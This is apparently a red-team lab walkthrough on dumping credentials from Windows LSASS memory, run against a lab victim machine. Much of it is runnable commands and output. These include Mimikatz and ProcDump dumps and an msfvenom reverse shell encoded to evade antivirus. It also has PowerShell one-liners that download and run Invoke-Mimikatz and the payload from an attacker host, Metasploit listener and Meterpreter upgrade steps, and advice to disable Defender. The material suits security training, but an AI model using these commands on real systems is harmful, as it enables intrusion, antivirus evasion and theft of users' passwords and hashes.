## Why Target LSASS?

Adversaries may attempt to access credential material stored in the process memory of the Local Security Authority Subsystem Service (LSASS). After a user logs on, the system generates and stores a variety of credential materials in LSASS process memory. These credential materials can be harvested by an administrative user or SYSTEM.

Upon starting up, LSASS contains valuable authentication data such as:
- encrypted passwords
- NT hashes
- LM hashes
- Kerberos tickets

NTLM credentials are based on data obtained during the interactive logon process and consist of a domain name, a user name, and a one-way hash of the user's password. NTLM uses an encrypted challenge/response protocol to authenticate a user without sending the user's password over the wire. Instead, the system requesting authentication must perform a calculation that proves it has access to the secured NTLM credentials.

You're gonna want the LM hash to crack/PTH with

```
Administrator::500:<NT hash>:<LM hash here>:::
```

## Resources

- https://attack.mitre.org/techniques/T1003/001/
- https://www.microsoft.com/en-us/security/blog/2022/10/05/detecting-and-preventing-lsass-credential-dumping-attacks/
- https://redcanary.com/threat-detection-report/techniques/lsass-memory/
- https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/component-updates/command-line-process-auditing
- https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon
- https://www.ired.team/offensive-security/credential-access-and-credential-dumping/dump-credentials-from-lsass-process-without-mimikatz

## How Do?

Attacker Kali Machine: `192.168.163.128` (run `ifconfig`)
Victim Windows Machine: `192.168.163.136` (run `ipconfig`)

- Make sure Network Discovery is turned on on your victim machine

### Task Manager

Task Manager is capable of dumping arbitrary process memory if executed under a privileged user account. It’s as simple as right-clicking on the LSASS process and hitting “Create Dump File.” The Create Dump File calls the `MiniDumpWriteDump` function implemented in `dbghelp.dll` and `dbgcore.dll`.

- Requirements: initial access to a machine directly (e.g. via RDP)
- Detections: Defender will catch messing around with LSASS memory, make sure you turn it off to actually collect the DMP file

```
// find LSASS in the list, right-click on LSASS, dump process memory
```

Transfer the dump to your attacker Windows machine and use Mimikatz to get a hold of the credentials:

```
// extract credentials on attacker machine
// copy/paste dump out
mimikatz.exe
sekurlsa::minidump lsass.dmp
sekurlsa::logonPasswords
```

### ProcDump

- Requirements: initial access to a machine directly (e.g. via RDP)
- Detections: Defender will catch messing around with LSASS memory, make sure you turn it off to actually collect the DMP file

```
// dump LSASS manually
// copy/paste procdump into tmp
tasklist /fi "imagename eq lsass.exe"
procdump.exe -accepteula -ma 656 C:\ProgramData\lsass656.dmp
```

Transfer the dump to your attacker Windows machine and use Mimikatz to get a hold of the credentials:

```
// extract credentials on attacker machine
// copy/paste dump out
mimikatz.exe
sekurlsa::minidump lsass.dmp
sekurlsa::logonPasswords
```

### Mimikatz Local Execution

Among other things, Mimikatz modules facilitate password hash extraction from the Local Security Authority Subsystem (LSASS) process memory where they are cached.

- Requirements: initial access to a machine directly (e.g. via RDP)
- Detections: Mimikatz will get caught on disk, make sure you turn it off to actually be able to execute it

Since LSASS is a privileged process running under the SYSTEM user, we must launch Mimikatz from an administrative command prompt. To extract password hashes, we must first execute two commands.

* The first is `privilege::debug` which enables the SeDebugPrivilege access right required to tamper with another process. If this command fails, Mimikatz was most likely not executed with administrative privileges.
* It's important to understand that LSASS is a SYSTEM process, which means that it has even higher privileges that Mimikatz running with administrative privileges. To address this, we can use the `token::elevate` command to elevate the security token from high integrity (administrator) to SYSTEM integrity.

```
// Mimikatz Executable - dropped to disk
mimikatz.exe
privilege::debug
token::elevate
lsadump::sam
```

```
// Invoke-Mimikatz - in-memory loaded

// download the script from Github and host it on your attacker machine
python3 -m http.server 3000

// run the thing
powershell IEX (New-Object System.Net.Webclient).DownloadString('http://192.168.163.128:3000/Invoke-Mimikatz.ps1') ; Invoke-Mimikatz -DumpCreds
```

### CrackMapExec

- Requirements: remote access and initial credentials
- Detections: needs further testing

https://wiki.porchetta.industries/smb-protocol/obtaining-credentials/dump-lsass

```
// direct execution with CrackMapExec

// Lsassy
#~ cme smb 192.168.255.131 -u administrator -p pass -M lsassy
#~ cme smb 192.168.255.131 -u administrator -H NTLM_hash -M lsassy

// Nanodump
#~ cme smb 192.168.255.131 -u administrator -p pass -M nanodump
#~ cme smb 192.168.255.131 -u administrator -H NTLM_hash -M nanodump
```

### Getting a Meterpreter Shell to Dump Creds

- Requirements: remote access to a previously installed implant
- Detections: SmartScreen won't be happy with you downloading it using a browser, just hit all the 'Run Anyway' prompts, and Defender will generally catch a basic Meterpreter shell

1. Generate a payload with `msfvenom`

```
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.163.128 LPORT=4444 -f exe -e x86/shikata_ga_nai -i 9 -o shell_reverse_msf_encoded.exe
```

`-p` is specifying the payload type
`LHOST` is specifying the attacker machine for the reverse shell to call back to
`LPORT` is specify the port to call back on
`-f` is specifying the format of the generated payload (decided to go with exe cause powershell kept messing with me)
`-e` is specifying the encoding of the payload - a technique for antivirus evasion which we'll chat about in a future session
`-i` is specifying the number of iterations to perform that encoding - more iterations == more obfuscation
`-o` is specifying the output file name, if not specified it just dumps it to the console

2. Serve up the payload so we can download it on the victim machine

```
cd directory/where/payload/is/sitting
python3 -m http.server 3000 
```

3. Prepare `msfconsole` to receive the connection

```
sudo msfconsole

// setting up listener to handle any connections coming back to the attacker machine
use multi/handler 

// so you can see what options we need to set
show options 

// matching the payload that we generated earlier, so Metasploit knows how to communicate with the shell properly
set payload windows/shell_reverse_tcp 

// your attacker machine IP from the payload generation
set LHOST 192.168.163.128 

// attacker port from the payload generation
set LPORT 4444 

// run your listener!
exploit
```

> NOTE: specifying the incorrect payload when either generating it or configuring your listener is OFTEN why Metasploit things don't work, so keep a close eye on it when you're generating payloads and configuring listeners - double check all your things

4. Now we're going to pop over to our victim machine and execute the payload

Feel free to use something like this PowerShell one-liner to grab the payload from your little HTTP server:

```
powershell -command "$Z='http://192.168.163.128:3000/shell_reverse_msf_encoded.exe';IEX (New-Object Net.webclient).Downloadstring($Z)"
```

This will download and execute all inline, saving it dropping to disk. Buuut if that doesn't play ball, just navigate to the URL in a browser like we did during the demo and download it directly.

When you have it, make sure you execute it from an elevated command prompt so we can do all the Mimikatz goodness!

5. Upgrade your shell!

Once you execute the payload on your victim machine, navigate back to your attacker machine and Metasploit console. You should see a connection coming back and being opened via the listener we set up earlier

```
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 192.168.163.128:4444 
[*] Command shell session 4 opened (192.168.163.128:4444 -> 192.168.163.136:50841) at 2023-01-12 22:26:12 -0500


Shell Banner:
Microsoft Windows [Version 10.0.19045.2006]
-----
          

C:\Users\Red Team Victim\Downloads>
```

Now what we have here is a normal Windows Command Prompt - not a magical Meterpreter shell with all the additional Mimikatz juice we want to test out, so we need to make use of another Metasploit module to upgrade it.

First things first, hit CTRL+Z to *background* the session (if you hit CTRL+C, you'll be asked to ABORT it, don't do that).

Once you're back at the `msf` console prompt, run the following commands to upgrade the session to a Meterpreter shell:

```
// view the currently open sessions, will allow you to see the ID of the session we want to upgrade
sessions

// this is the post-exploitation module we need to use
use post/multi/manage/shell_to_meterpreter

// view the options you'll need to set, LPORT will already be configured which we won't change
options

// make sure your attacker machine is where the Meterpreter shell will call back to
set LHOST 192.168.163.128

// target your currently open session, found from running sessions earlier
set SESSION 4

// do the thingggg
exploit
```

When you run `exploit`, an additional handler will be started, and you should have an additional session opened with a Meterpreter shell

6. Get them Creds

Once your new session has come back you should see something like the following:

```
msf6 post(multi/manage/shell_to_meterpreter) > sessions

Active sessions
===============

  Id  Name  Type                     Information                                                      Connection
  --  ----  ----                     -----------                                                      ----------
  4         shell x86/windows        Shell Banner: Microsoft Windows [Version 10.0.19045.2006] -----  192.168.163.128:4444 -> 192.168.163.136:50841 (192.168.163.136)
  5         meterpreter x64/windows  DESKTOP-A97U9UJ\Red Team Victim @ DESKTOP-A97U9UJ                192.168.163.128:4433 -> 192.168.163.136:50843 (192.168.163.136)
```

Where session 5 here is the juicy Meterpreter one! Let's interact with it and use Mimikatz to get some creds.

```
// connect to the Meterpreter session
sessions -i 5

// load the Mimikatz library and get them creeeeds
load kiwi
getsystem
creds_msv

// the help menu in Metasploit is always wonderful, so defs use it all the time hehe
help

Kiwi Commands
=============

    Command                Description
    -------                -----------
    creds_all              Retrieve all credentials (parsed)
    creds_kerberos         Retrieve Kerberos creds (parsed)
    creds_livessp          Retrieve Live SSP creds
    creds_msv              Retrieve LM/NTLM creds (parsed)
    creds_ssp              Retrieve SSP creds
    creds_tspkg            Retrieve TsPkg creds (parsed)
    creds_wdigest          Retrieve WDigest creds (parsed)
    dcsync                 Retrieve user account information via DCSync (unparsed)
    dcsync_ntlm            Retrieve user account NTLM hash, SID and RID via DCSync
    golden_ticket_create   Create a golden kerberos ticket
    kerberos_ticket_list   List all kerberos tickets (unparsed)
    kerberos_ticket_purge  Purge any in-use kerberos tickets
    kerberos_ticket_use    Use a kerberos ticket
    kiwi_cmd               Execute an arbitary mimikatz command (unparsed)
    lsa_dump_sam           Dump LSA SAM (unparsed)
    lsa_dump_secrets       Dump LSA secrets (unparsed)
    password_change        Change the password/hash of a user
    wifi_list              List wifi profiles/creds for the current user
    wifi_list_shared       List shared wifi profiles/creds (requires SYSTEM)
```

7. Profit

### COMSVCS Minidump

 Rundl32 can execute the Windows native DLL `comsvcs.dll`, which exports a function called MiniDump. When this export function is called, adversaries can feed in a process ID such as LSASS and create a MiniDump file.

- Requirements:  access to the machine or remote access to a previously installed implant
- Detections: SmartScreen won't be happy with you downloading the beacon from IE, just hit all the 'Run Anyway' prompts, and will also not be happy with you messing with LSASS memory, so turn it off before you run the Minidump

```
// doing it manually with access to the machine
tasklist /fi "imagename eq lsass.exe"
cd C:\Windows\System32
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 656 C:\ProgramData\lsassCS.dmp full
```

https://gist.github.com/JohnLaTwC/3e7dd4cd8520467df179e93fb44a434e

```
// doing it with Cobalt Strike - just for knowledge purposes, will ask around about distribution of this copy of Cobalt Strike :)

// set up the GUI
sudo ./teamserver.sh 192.168.163.128 password // start the teamserver
sudo ./cobaltstrike.sh // start the client to launch the GUI
// after that it's basically point and shoot

// generate a beacon
// clicky clicky

// do the thing
// clicky clicky
```



